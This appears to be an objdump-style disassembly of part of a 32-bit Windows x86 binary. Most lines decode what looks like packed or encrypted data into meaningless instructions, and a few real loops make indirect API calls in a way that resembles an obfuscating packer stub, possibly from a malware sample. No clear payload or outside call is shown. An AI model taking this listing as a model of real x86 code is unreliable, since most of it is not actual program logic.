  401862:	xchg   ecx,eax
  401863:	mov    ch,0xc5
  401865:	mov    ebp,0xa05cd912
  40186a:	(bad)  
  40186b:	push   esi
  40186c:	mov    WORD PTR [ebx+0x7c],cs
  40186f:	or     al,0xef
  401871:	lods   al,BYTE PTR ds:[esi]
  401872:	push   esp
  401873:	shl    eax,0x7e
  401876:	xor    edi,eax
  401878:	adc    ch,0x34
  40187b:	dec    esi
  40187c:	das    
  40187d:	dec    esi
  40187e:	(bad)  
  40187f:	cmp    ch,al
  401881:	shl    BYTE PTR [edi-0x7a],0x29
  401885:	push   cs
  401886:	jmp    0xd78b33e
  40188b:	ret    0x1522
  40188e:	call   0xfd0feb7f
  401893:	and    eax,0xd6b91103
  401898:	xchg   ebp,eax
  401899:	shr    BYTE PTR [ecx+0x14584e4b],0x9f
  4018a0:	sub    eax,0x5bdee9b4
  4018a5:	dec    eax
  4018a6:	sbb    ecx,0x6e324ad0
  4018ac:	ret    0xb242
  4018af:	inc    ecx
  4018b0:	adc    BYTE PTR [edx],bl
  4018b2:	mov    ds:0x48f9f2b5,eax
  4018b7:	and    DWORD PTR [eax+0x197e4140],ebx
  4018bd:	jl     0x401921
  4018bf:	xchg   ebp,eax
  4018c0:	dec    edi
  4018c1:	and    eax,0xb95cb5c5
  4018c6:	add    ah,bh
  4018c8:	mov    esp,0xc948b111
  4018cd:	cmp    ecx,DWORD PTR [edx+ebx*8-0xcc9449f]
  4018d4:	xor    al,0x43
  4018d6:	push   0x3edd77ef
  4018db:	jg     0x401952
  4018dd:	cmp    eax,0x3cd2e1fe
  4018e2:	push   ecx
  4018e3:	rcr    bl,1
  4018e5:	push   edi
  4018e6:	lahf   
  4018e7:	and    ah,BYTE PTR [edi-0x2e172425]
  4018ed:	js     0x4018be
  4018ef:	jno    0x40193d
  4018f1:	xor    al,BYTE PTR fs:[esi-0x1b]
  4018f5:	les    ebx,FWORD PTR [ebx-0x27145205]
  4018fb:	aad    0x60
  4018fd:	ffreep st(0)
  4018ff:	pop    esp
  401900:	mov    ecx,0xfdd96504
  401905:	or     DWORD PTR [esi-0x78],eax
  401908:	popa   
  401909:	push   eax
  40190a:	pop    esi
  40190b:	xor    al,0x69
  40190d:	lods   eax,DWORD PTR ds:[esi]
  40190e:	loop   0x4018ee
  401910:	cli    
  401911:	mov    ah,0x2c
  401913:	popa   
  401914:	cmp    DWORD PTR [esi+0x6fddd1b9],0x15637089
  40191e:	mov    ch,0x8a
  401920:	and    bh,al
  401922:	xor    bh,bh
  401924:	jmp    0x4306:0xe995d27a
  40192b:	popa   
  40192c:	jp     0x401913
  40192e:	rcr    DWORD PTR [esi],cl
  401930:	add    ebp,eax
  401932:	div    BYTE PTR [ebx+0x5f4209e9]
  401938:	je     0x40191d
  40193a:	loope  0x4019a7
  40193c:	dec    esp
  40193d:	mov    edi,0x28354d08
  401942:	dec    esp
  401943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401944:	cmp    bh,BYTE PTR [ebp-0x3efcaea4]
  40194a:	int3   
  40194b:	xchg   ebp,eax
  40194c:	fucompp 
  40194e:	pop    es
  40194f:	and    DWORD PTR [esi],ecx
  401951:	pop    cx
  401953:	sbb    al,0x5
  401955:	mov    esi,DWORD PTR [esi-0x2bab7ac2]
  40195b:	lahf   
  40195c:	(bad)  
  40195d:	icebp  
  40195e:	or     al,0x1b
  401960:	out    0x1,al
  401962:	arpl   di,bx
  401964:	inc    ebp
  401965:	outs   dx,BYTE PTR ds:[esi]
  401966:	mov    edx,?
  401968:	addr16 into 
  40196a:	jecxz  0x4019a2
  40196c:	or     al,0xc9
  40196e:	outs   dx,DWORD PTR ds:[esi]
  40196f:	das    
  401970:	test   DWORD PTR [ecx],esi
  401972:	into   
  401973:	xchg   esi,eax
  401974:	aas    
  401975:	jp     0x4019f1
  401977:	dec    esi
  401978:	daa    
  401979:	cmp    DWORD PTR [edi],ebp
  40197b:	(bad)  
  40197c:	clc    
  40197d:	jmp    0x10adbea5
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	inc    ecx
  4019a4:	outs   dx,BYTE PTR ds:[esi]
  4019a5:	fild   DWORD PTR gs:[edx-0x18787ff]
  4019ac:	jle    0x401a26
  4019ae:	js     0x4019b8
  4019b0:	ficom  WORD PTR [edi-0x3fb5fd0]
  4019b6:	inc    esp
  4019b7:	stos   DWORD PTR es:[edi],eax
  4019b8:	mov    eax,0x7e2ab7
  4019bd:	rcl    DWORD PTR [eax-0x40],0xf2
  4019c1:	cmp    al,0x2e
  4019c3:	push   eax
  4019c4:	retf   
  4019c5:	cmp    eax,0xcc41a733
  4019ca:	pop    ecx
  4019cb:	lods   eax,DWORD PTR ds:[esi]
  4019cc:	inc    edx
  4019cd:	and    al,0xe4
  4019cf:	mov    bl,0x7a
  4019d1:	iret   
  4019d2:	add    DWORD PTR [eax],ebp
  4019d4:	pop    ss
  4019d5:	clc    
  4019d6:	pop    eax
  4019d7:	dec    ebx
  4019d8:	hlt    
  4019d9:	lods   al,BYTE PTR ds:[esi]
  4019da:	pusha  
  4019db:	cmp    eax,0xa2e8ae90
  4019e0:	xchg   ebx,eax
  4019e1:	outs   dx,DWORD PTR ds:[esi]
  4019e2:	jmp    0x401980
  4019e4:	push   es
  4019e5:	dec    eax
  4019e6:	jns    0x401a47
  4019e8:	cmp    eax,0x89cbbd92
  4019ed:	loop   0x401a4f
  4019ef:	call   0xcec59f87
  4019f4:	setg   BYTE PTR [ecx+0x79]
  4019f8:	adc    ah,cl
  4019fa:	jae    0x40197e
  4019fc:	sub    edx,DWORD PTR [edx-0x40]
  4019ff:	adc    al,0x71
  401a01:	leave  
  401a02:	iret   
  401a03:	stc    
  401a04:	sub    al,BYTE PTR ds:0x2ae88dd
  401a0a:	mov    DWORD PTR [eax-0x743dff65],ecx
  401a10:	outs   dx,BYTE PTR ds:[esi]
  401a11:	repnz cdq 
  401a13:	xor    dl,BYTE PTR [edi-0x6085533f]
  401a19:	mov    BYTE PTR [esi-0x75],dl
  401a1c:	loopne 0x4019d7
  401a1e:	lahf   
  401a1f:	inc    esp
  401a20:	stc    
  401a21:	mov    ds:0x5008c562,eax
  401a26:	pop    ss
  401a27:	popa   
  401a28:	frstor [ebx+0x1d]
  401a2b:	push   0x76
  401a2d:	adc    DWORD PTR [eax+ecx*1+0x7420f649],ebp
  401a34:	sbb    cl,al
  401a36:	psrld  mm5,0x6f
  401a3a:	ins    DWORD PTR es:[edi],dx
  401a3b:	inc    edi
  401a3c:	imul   esi,edx,0x9a9777a3
  401a42:	add    al,0x30
  401a44:	loope  0x401a13
  401a46:	je     0x401a66
  401a48:	(bad)  
  401a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a4a:	jb     0x401a41
  401a4c:	bound  edi,QWORD PTR [edx]
  401a4e:	cmp    ebp,ebp
  401a50:	jmp    0x6be:0xf749fd59
  401a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a58:	sbb    BYTE PTR [edi+0x40],al
  401a5b:	xchg   ebx,eax
  401a5c:	push   ecx
  401a5d:	std    
  401a5e:	js     0x401a85
  401a60:	sar    DWORD PTR [ebx-0x16],cl
  401a63:	push   esi
  401a64:	fstp   DWORD PTR [ebx-0x7b90afe2]
  401a6a:	test   al,0xc4
  401a6c:	in     al,0x72
  401a6e:	enter  0xe03f,0x99
  401a72:	jno    0x401ae5
  401a74:	xor    bh,BYTE PTR [esi+0x2401eb34]
  401a7a:	fsubr  QWORD PTR [ecx-0x13]
  401a7d:	stos   BYTE PTR es:[edi],al
  401a7e:	push   0xb8bce0d2
  401a83:	adc    al,0xac
  401a85:	jns    0x401a79
  401a87:	popf   
  401a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a89:	jp     0x401aad
  401a8b:	jp     0x401a4e
  401a8d:	push   0x5c
  401a8f:	stc    
  401a90:	fstp   QWORD PTR [edi]
  401a92:	xor    ch,BYTE PTR [edx-0x36]
  401a95:	pop    ds
  401a96:	mov    al,0x11
  401a98:	sbb    esi,DWORD PTR [bx+si-0x24]
  401a9c:	stos   DWORD PTR es:[edi],eax
  401a9d:	dec    eax
  401a9e:	adc    eax,0xf8aadc87
  401aa3:	mov    ss,WORD PTR [esi]
  401aa5:	pop    ss
  401aa6:	les    ebp,FWORD PTR [esi-0x10]
  401aa9:	jae    0x401aab
  401aab:	mov    cl,0x23
  401aad:	out    dx,eax
  401aae:	test   al,0xfe
  401ab0:	mov    ch,0xe5
  401ab2:	leave  
  401ab3:	popf   
  401ab4:	(bad)  
  401ab5:	std    
  401ab6:	cld    
  401ab7:	jne    0x401a74
  401ab9:	pop    ss
  401aba:	aaa    
  401abb:	push   ecx
  401abc:	push   ebp
  401abd:	and    BYTE PTR [eax],0x2e
  401ac0:	push   edx
  401ac1:	mov    ds:0x473f97e3,al
  401ac6:	dec    ecx
  401ac7:	sar    BYTE PTR [eax+0x2d78a1b8],cl
  401acd:	idiv   esi
  401acf:	sbb    ah,cl
  401ad1:	or     BYTE PTR cs:[edi],0xf9
  401ad5:	out    0xdf,eax
  401ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ad8:	pop    ebp
  401ad9:	rol    DWORD PTR [ebp-0x686456f7],0x63
  401ae0:	jl     0x401ac5
  401ae2:	mov    ds:0xbda294c0,eax
  401ae7:	test   BYTE PTR [ebx*1+0x2f309cae],cl
  401aee:	dec    ebp
  401aef:	xlat   BYTE PTR ds:[ebx]
  401af0:	ss push edi
  401af2:	jg     0x401b13
  401af4:	mov    ebp,0x27f38ddb
  401af9:	jae    0x401abb
  401afb:	clc    
  401afc:	fst    QWORD PTR [eax-0x4e7a7bbd]
  401b02:	push   ecx
  401b03:	pop    ds
  401b04:	xchg   esp,eax
  401b05:	leave  
  401b06:	sub    BYTE PTR [esi+0x48],0x7b
  401b0a:	inc    ebp
  401b0b:	loopne 0x401ae5
  401b0d:	rcr    DWORD PTR ds:0xbe0f96ce,cl
  401b13:	sub    eax,0x8cfbc8c
  401b18:	pop    ebp
  401b19:	pop    esp
  401b1a:	dec    edi
  401b1b:	cmp    eax,0xd3916dd3
  401b20:	cmp    DWORD PTR fs:[ebp-0x60],esi
  401b24:	sub    DWORD PTR [edi+0x1a],esi
  401b27:	xor    cl,ah
  401b29:	pop    edx
  401b2a:	mov    cl,0x9a
  401b2c:	rol    ah,0xe3
  401b2f:	fwait
  401b30:	jmp    0xf9d2abea
  401b35:	sbb    ecx,edx
  401b37:	mov    DWORD PTR ds:0xf126f862,ecx
  401b3d:	hlt    
  401b3e:	out    0x15,al
  401b40:	pop    edi
  401b41:	mov    edx,DWORD PTR [eax]
  401b43:	mov    ebx,0x4daa700
  401b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b49:	shr    BYTE PTR [ebp+eiz*1+0x55],1
  401b4d:	in     al,dx
  401b4e:	dec    ecx
  401b4f:	(bad)  
  401b51:	cmp    ebx,ebp
  401b53:	sbb    eax,0x7805324e
  401b58:	enter  0x1d2d,0xd1
  401b5c:	mov    cl,0x48
  401b5e:	nop
  401b5f:	or     eax,0x8fa2924b
  401b64:	xchg   ebx,ebx
  401b66:	sub    eax,0xa6c2e6b5
  401b6b:	sbb    DWORD PTR [ecx-0x8],ecx
  401b6e:	inc    ebx
  401b6f:	sbb    al,0x6d
  401b71:	xchg   ecx,eax
  401b72:	adc    eax,0x235a68af
  401b77:	mov    bl,0x52
  401b79:	add    edx,DWORD PTR [eax]
  401b7b:	push   edx
  401b7c:	mov    ds:0xba31dae1,al
  401b81:	add    bh,BYTE PTR [ebx+0x54]
  401b84:	mov    ds:0xc41b6e72,al
  401b89:	mov    al,ds:0x6f28abbb
  401b8e:	mov    DWORD PTR [esi+0x1e13afc5],esi
  401b94:	jbe    0x401b37
  401b96:	out    0xb6,eax
  401b98:	mov    ebx,0x1d13ea81
  401b9d:	dec    ecx
  401b9e:	icebp  
  401b9f:	ror    DWORD PTR [edx+0x9],1
  401ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ba3:	sub    al,BYTE PTR [esi]
  401ba5:	clc    
  401ba6:	mov    bh,0x73
  401ba8:	(bad)  
  401baa:	(bad)  
  401bab:	xlat   BYTE PTR ds:[ebx]
  401bac:	das    
  401bad:	loopne 0x401c00
  401baf:	sti    
  401bb0:	out    dx,eax
  401bb1:	push   ss
  401bb2:	push   ebp
  401bb3:	imul   esi,DWORD PTR [ebx-0x51],0x61
  401bb7:	out    dx,eax
  401bb8:	add    ah,dl
  401bba:	adc    BYTE PTR [edi+edx*8+0x25eb362e],0x5a
  401bc2:	and    DWORD PTR [edx-0x2a],ebp
  401bc5:	aaa    
  401bc6:	pushf  
  401bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bc8:	sbb    esi,DWORD PTR [ebx-0x42cea98f]
  401bce:	pop    ds
  401bcf:	outs   dx,BYTE PTR ds:[esi]
  401bd0:	fwait
  401bd1:	push   ss
  401bd2:	mov    ds:0x4e340d8c,eax
  401bd7:	jbe    0x401bb6
  401bd9:	pushf  
  401bda:	and    eax,0xcd512ee3
  401bdf:	cmp    BYTE PTR [ebp-0x7341bcec],dl
  401be5:	mov    ebp,es
  401be7:	call   0x256ab26d
  401bec:	push   esp
  401bed:	ss std 
  401bef:	aad    0x72
  401bf1:	nop
  401bf2:	cmp    edi,DWORD PTR [ecx+eiz*2]
  401bf5:	das    
  401bf6:	test   eax,0xecae76a3
  401bfb:	jle    0x401c3b
  401bfd:	cld    
  401bfe:	pop    ebp
  401bff:	adc    eax,0xa1046b5f
  401c04:	jnp    0x401bdf
  401c06:	popa   
  401c07:	or     edi,DWORD PTR [ebx+0x496b5585]
  401c0d:	add    ch,BYTE PTR [edi+0x0]
  401c10:	rcl    DWORD PTR [ebp+0x8c9d50b],cl
  401c16:	stos   BYTE PTR es:[edi],al
  401c17:	loopne 0x401b9d
  401c19:	ins    BYTE PTR es:[edi],dx
  401c1a:	fldcw  WORD PTR [ebx+0xb]
  401c1d:	mov    bl,cl
  401c1f:	lock int3 
  401c21:	inc    ebx
  401c22:	cdq    
  401c23:	sub    DWORD PTR [eiz*2+0xd9fdfc1],edi
  401c2a:	mov    esi,0x71e2e665
  401c2f:	fbld   TBYTE PTR [edx-0x77]
  401c32:	inc    ebp
  401c33:	loopne 0x401bb6
  401c35:	and    eax,0x42a83d
  401c3a:	add    BYTE PTR [eax],al
  401c3c:	add    BYTE PTR [eax],al
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xf2ba
  401d05:	lahf   
  401d06:	mov    eax,ds:0x7806000c
  401d0b:	js     0x401d0b
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d08
  401d11:	jg     0x401d3c
  401d13:	sub    dl,BYTE PTR [ecx-0x41d6c1fd]
  401d19:	push   0xd6cc2056
  401d1e:	push   eax
  401d1f:	add    al,0x81
  401d21:	popa   
  401d22:	pop    ss
  401d23:	lods   eax,DWORD PTR ds:[esi]
  401d24:	pop    ds
  401d25:	das    
  401d26:	addr16 jae 0x401d59
  401d29:	icebp  
  401d2a:	sbb    eax,0xb8fa65db
  401d2f:	sub    eax,0xcf1dc51a
  401d34:	xor    al,0xa5
  401d36:	loop   0x401d4f
  401d38:	es mov al,0xd9
  401d3b:	push   es
  401d3c:	add    BYTE PTR [edx+0x4b],0xcf
  401d40:	(bad)  
  401d41:	sub    eax,0x9696065
  401d46:	nop
  401d47:	mov    al,0xa1
  401d49:	jae    0x401d9d
  401d4b:	scas   al,BYTE PTR es:[edi]
  401d4c:	jg     0x401d77
  401d4e:	mov    al,ds:0xb6a4d4d7
  401d53:	xor    BYTE PTR [ecx+0x5efa24fc],dl
  401d59:	pop    ebp
  401d5a:	add    eax,0xaf7a951b
  401d5f:	sub    esp,DWORD PTR [edi-0x2cd2deaf]
  401d65:	add    DWORD PTR [esi],0x19bbfe8d
  401d6b:	in     eax,0x61
  401d6d:	leave  
  401d6e:	jo     0x401d47
  401d70:	mov    ah,0xb0
  401d72:	jns    0x401d27
  401d74:	mov    fs,WORD PTR [ebp+0x149cf0a5]
  401d7a:	sub    BYTE PTR [ebx],ah
  401d7c:	(bad)  
  401d7d:	ds inc edx
  401d7f:	jecxz  0x401dca
  401d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d82:	lahf   
  401d83:	push   esi
  401d84:	rol    BYTE PTR [ebp+0x69a7b9f1],cl
  401d8a:	mov    dl,0x6c
  401d8c:	mov    cl,0x2a
  401d8e:	and    DWORD PTR [ebx],0xffffffe0
  401d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d92:	and    BYTE PTR [ecx+esi*4],ah
  401d95:	fwait
  401d96:	inc    edx
  401d97:	xor    edx,DWORD PTR [ebp+0x33]
  401d9a:	mov    eax,ds:0xe301805a
  401d9f:	rcl    BYTE PTR [ebx],1
  401da1:	push   edi
  401da2:	or     DWORD PTR [esi],esp
  401da4:	or     DWORD PTR [edi-0x65a5e12],0x42
  401dab:	cld    
  401dac:	in     eax,dx
  401dad:	fstp   TBYTE PTR [edx]
  401daf:	loop   0x401e18
  401db1:	jge    0x401ded
  401db3:	fidiv  DWORD PTR [ebx-0x4b964185]
  401db9:	dec    edx
  401dba:	mov    bl,0x44
  401dbc:	sbb    al,dh
  401dbe:	adc    eax,0x81476c72
  401dc3:	hlt    
  401dc4:	dec    edx
  401dc5:	mov    edx,0x4d1db2a8
  401dca:	jg     0x401dfa
  401dcc:	in     eax,dx
  401dcd:	mov    dh,0x5e
  401dcf:	adc    BYTE PTR [eax+0x44],bl
  401dd2:	pop    ebp
  401dd3:	leave  
  401dd4:	scas   al,BYTE PTR es:[edi]
  401dd5:	iret   
  401dd6:	inc    edi
  401dd7:	ficomp WORD PTR [ebx]
  401dd9:	in     al,dx
  401dda:	imul   edi,DWORD PTR [esi+ecx*4-0x12]
  401ddf:	push   ds
  401de0:	push   ds
  401de1:	fmul   QWORD PTR [esi+0x2a]
  401de4:	sbb    BYTE PTR [eax],al
  401de6:	nop
  401de7:	clc    
  401de8:	mov    bl,0x21
  401dea:	in     al,dx
  401deb:	cdq    
  401dec:	xchg   ecx,eax
  401ded:	xor    DWORD PTR [esi+eax*8-0x6d],ebx
  401df1:	xor    edi,DWORD PTR [eax+0x7d54d224]
  401df7:	sub    eax,0xc4462719
  401dfc:	cdq    
  401dfd:	test   eax,0x4a4f2211
  401e02:	sub    esi,DWORD PTR [ecx+0x3c]
  401e05:	int3   
  401e06:	xchg   ebx,eax
  401e07:	out    0x56,al
  401e09:	call   0x4396:0xc5b75bf5
  401e10:	pusha  
  401e11:	loop   0x401dda
  401e13:	mov    dh,0xbe
  401e15:	pop    edi
  401e16:	inc    DWORD PTR [esi+0x166559f9]
  401e1c:	ds push ebx
  401e1e:	dec    eax
  401e1f:	jo     0x401e51
  401e21:	pop    ebp
  401e22:	xor    BYTE PTR [ecx-0x479fb13b],bh
  401e28:	cmp    bl,BYTE PTR [ebx]
  401e2a:	scas   eax,DWORD PTR es:[edi]
  401e2b:	enter  0xf27f,0xfd
  401e2f:	jp     0x401ea5
  401e31:	inc    edx
  401e32:	cmp    cl,BYTE PTR [bp+si-0xf]
  401e36:	push   es
  401e37:	in     eax,dx
  401e38:	pop    ecx
  401e39:	mov    ebx,0xb3d7a044
  401e3e:	jle    0x401e81
  401e40:	sub    DWORD PTR [eax],ebx
  401e42:	das    
  401e43:	dec    eax
  401e44:	jae    0x401dee
  401e46:	mov    cl,0x61
  401e48:	sub    al,0xe5
  401e4a:	jnp    0x401e22
  401e4c:	sbb    eax,0xa3ba092d
  401e51:	retf   0x1d29
  401e54:	fs jnp 0x401e65
  401e57:	clc    
  401e58:	pop    ss
  401e59:	or     al,0x53
  401e5b:	xor    al,0xee
  401e5d:	ins    BYTE PTR es:[edi],dx
  401e5e:	or     edi,DWORD PTR gs:[esi+0x7b5bd9ae]
  401e65:	cs dec ebx
  401e67:	inc    esp
  401e68:	mov    bl,0x2
  401e6a:	ja     0x401eea
  401e6c:	mov    cl,0xd
  401e6e:	pop    esp
  401e6f:	popf   
  401e70:	int3   
  401e71:	adc    al,0x9b
  401e73:	xor    DWORD PTR [edi+0x43],edi
  401e76:	sbb    BYTE PTR [ecx+0x28c24381],ah
  401e7c:	dec    esi
  401e7d:	es out 0xc1,al
  401e80:	push   ebx
  401e81:	mov    esi,0xf575240c
  401e86:	stc    
  401e87:	pop    edi
  401e88:	add    cl,bh
  401e8a:	cld    
  401e8b:	aad    0x60
  401e8d:	pop    esp
  401e8e:	popa   
  401e8f:	into   
  401e90:	add    al,0xb8
  401e92:	dec    esp
  401e93:	jmp    0xa18a:0x83f29c37
  401e9a:	or     ch,bh
  401e9c:	mul    DWORD PTR [edi+0x23]
  401e9f:	and    BYTE PTR [ebx+0x3b],ah
  401ea2:	repnz ins DWORD PTR es:[edi],dx
  401ea4:	or     cl,dl
  401ea6:	not    DWORD PTR [esi-0x761338ac]
  401eac:	xor    al,0xd8
  401eae:	xchg   DWORD PTR [ebp-0x170d88b7],ebp
  401eb4:	jno    0x401e4c
  401eb6:	adc    ah,dh
  401eb8:	daa    
  401eb9:	adc    BYTE PTR [ebx+0x23e36e06],cl
  401ebf:	scas   eax,DWORD PTR es:[edi]
  401ec0:	rol    BYTE PTR [esi+0x1c],0xdd
  401ec4:	aad    0x59
  401ec6:	push   es
  401ec7:	adc    dh,ah
  401ec9:	mov    bh,0x4e
  401ecb:	lea    eax,[edi]
  401ecd:	xlat   BYTE PTR ds:[ebx]
  401ece:	jecxz  0x401f15
  401ed0:	xchg   esi,esi
  401ed2:	enter  0x96a2,0x1c
  401ed6:	scas   eax,DWORD PTR es:[edi]
  401ed7:	jmp    0xc441:0x74192ca3
  401ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401edf:	ins    BYTE PTR es:[edi],dx
  401ee0:	aam    0xdb
  401ee2:	push   edx
  401ee3:	(bad)  
  401ee4:	shl    esp,cl
  401ee6:	push   cs
  401ee7:	mov    fs,ebx
  401ee9:	xchg   edi,eax
  401eea:	and    al,0xe0
  401eec:	pop    esi
  401eed:	lods   al,BYTE PTR ds:[esi]
  401eee:	pop    ecx
  401eef:	sub    edi,esi
  401ef1:	dec    ebp
  401ef2:	inc    ebx
  401ef3:	push   edi
  401ef4:	or     bh,BYTE PTR [ebx+0x1cca1904]
  401efa:	das    
  401efb:	jbe    0x401efd
  401efd:	xlat   BYTE PTR ds:[ebx]
  401efe:	mov    cs,WORD PTR [ecx]
  401f00:	(bad)  
  401f01:	mov    esp,0x16e9d974
  401f06:	inc    ebp
  401f07:	(bad)  
  401f08:	and    al,0x91
  401f0a:	imul   esp,DWORD PTR [ebx+0x5ad7271a],0xb
  401f11:	mov    ds:0x2e1b602c,eax
  401f16:	stc    
  401f17:	int    0xfa
  401f19:	into   
  401f1a:	(bad)  
  401f1b:	mov    cl,0x50
  401f1d:	rep ins BYTE PTR es:[edi],dx
  401f1f:	xchg   esp,eax
  401f20:	popa   
  401f21:	dec    ebx
  401f22:	xchg   esp,eax
  401f23:	and    BYTE PTR [ebp+0x7ea4a2ee],bl
  401f29:	dec    esi
  401f2a:	(bad)  
  401f2b:	(bad)  
  401f2c:	cli    
  401f2d:	aam    0x66
  401f2f:	retf   
  401f30:	mov    bl,0x74
  401f32:	clc    
  401f33:	pop    ds
  401f34:	xor    bh,BYTE PTR [ecx+0x6b]
  401f37:	fs mov ch,0xf8
  401f3a:	pop    ecx
  401f3b:	inc    edx
  401f3c:	sbb    DWORD PTR [edi-0x616e874b],ebx
  401f42:	aad    0x75
  401f44:	fimul  WORD PTR [eax]
  401f46:	rcl    BYTE PTR [esi+ecx*2],1
  401f49:	(bad)  
  401f4a:	sub    al,0x2b
  401f4c:	int    0x50
  401f4e:	jne    0x401fc5
  401f50:	inc    edx
  401f51:	push   es
  401f52:	xchg   ebx,eax
  401f53:	mov    eax,ds:0x798d9542
  401f58:	mov    esp,0x4b3ca5e7
  401f5d:	aam    0x20
  401f5f:	push   cs
  401f60:	adc    dh,BYTE PTR [esi]
  401f62:	iret   
  401f63:	mov    cl,0xcb
  401f65:	jmp    0x401fa3
  401f67:	push   edi
  401f68:	adc    esi,0xd2f6e076
  401f6e:	sar    ah,0x11
  401f71:	xor    edi,DWORD PTR [eax+0x46]
  401f74:	mov    ebx,0x7e25a1da
  401f79:	mov    WORD PTR [ecx],cs
  401f7b:	pop    ss
  401f7c:	fst    QWORD PTR [eax+0x1f]
  401f7f:	cdq    
  401f80:	sub    al,0xf8
  401f82:	ins    BYTE PTR es:[edi],dx
  401f83:	adc    al,0xbb
  401f85:	inc    esi
  401f86:	lock push es
  401f88:	stc    
  401f89:	push   edx
  401f8a:	arpl   WORD PTR [edx+ecx*2-0x38a8b230],cx
  401f91:	push   eax
  401f92:	add    ecx,DWORD PTR [eax]
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a839
  401f9c:	and    eax,DWORD PTR ds:0x42a889
  401fa2:	mov    ds:0x42a839,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a7f1,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a759,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [ecx-0x63],ecx
  402019:	pop    esi
  40201a:	rol    DWORD PTR [esi-0x18787fc],0x7e
  402021:	js     0x40209b
  402023:	cmp    dh,cl
  402025:	inc    edi
  402026:	je     0x402078
  402028:	dec    edx
  402029:	imul   ecx,DWORD PTR [ecx],0xffffffa8
  40202c:	add    edi,DWORD PTR [ebp+0x40]
  40202f:	push   0x59
  402031:	mov    esp,0xd34012c3
  402036:	mov    ds:0x69e87296,eax
  40203b:	fisub  DWORD PTR [edi]
  40203d:	push   edx
  40203e:	xchg   DWORD PTR [ebx],ebx
  402040:	jb     0x40209d
  402042:	pop    ecx
  402043:	addr16 dec ebx
  402045:	xor    al,0x57
  402047:	jmp    FWORD PTR [esi+eax*1+0x1a]
  40204b:	push   ss
  40204c:	js     0x401fd9
  40204e:	xor    BYTE PTR [ebx-0x4],ah
  402051:	or     al,0xda
  402053:	mov    eax,ds:0xd18e441d
  402058:	int    0xfe
  40205a:	push   ebp
  40205b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40205c:	sub    al,0xc5
  40205e:	mov    ch,0x7a
  402060:	js     0x402041
  402062:	jmp    0xd810:0x88da05f3
  402069:	cdq    
  40206a:	push   0xded92864
  40206f:	mov    ah,0xc6
